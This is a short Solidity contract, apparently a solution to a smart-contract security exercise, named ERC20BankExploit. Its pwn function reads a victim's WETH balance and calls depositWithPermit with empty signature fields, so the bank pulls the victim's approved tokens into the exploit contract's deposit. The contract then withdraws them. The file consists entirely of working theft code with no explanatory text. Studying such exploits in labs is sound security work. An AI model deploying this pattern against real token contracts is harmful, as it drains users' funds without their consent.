// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "sce/sol/IERC20.sol";
import {ERC20Bank} from "sce/sol/ERC20Bank.sol";

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn(address alice) external {
        address weth = address(ERC20Bank(target).token());
        uint256 bal = IERC20(weth).balanceOf(alice);
        ERC20Bank(target).depositWithPermit(
            alice, address(this), bal, 0, 0, "", ""
        );
        ERC20Bank(target).withdraw(bal);
    }
}
